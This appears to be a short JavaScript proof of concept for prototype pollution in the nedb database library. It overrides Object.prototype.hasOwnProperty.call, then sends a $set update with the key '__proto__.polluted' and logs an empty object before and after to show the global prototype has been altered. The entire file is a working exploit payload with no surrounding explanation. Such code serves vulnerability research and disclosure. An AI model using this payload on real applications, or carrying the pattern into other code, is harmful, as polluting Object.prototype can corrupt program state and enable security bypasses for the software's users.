Object.prototype.hasOwnProperty.call = () => true;
const Datastore = require('nedb');
const db = new Datastore();
console.log({}.polluted);
db.insert({ hello: 'world' }, err => {
    db.update({ hello: 'world' }, { $set: { '__proto__.polluted': 'yes' } }, {}, err => {
        console.log({}.polluted);
    });
});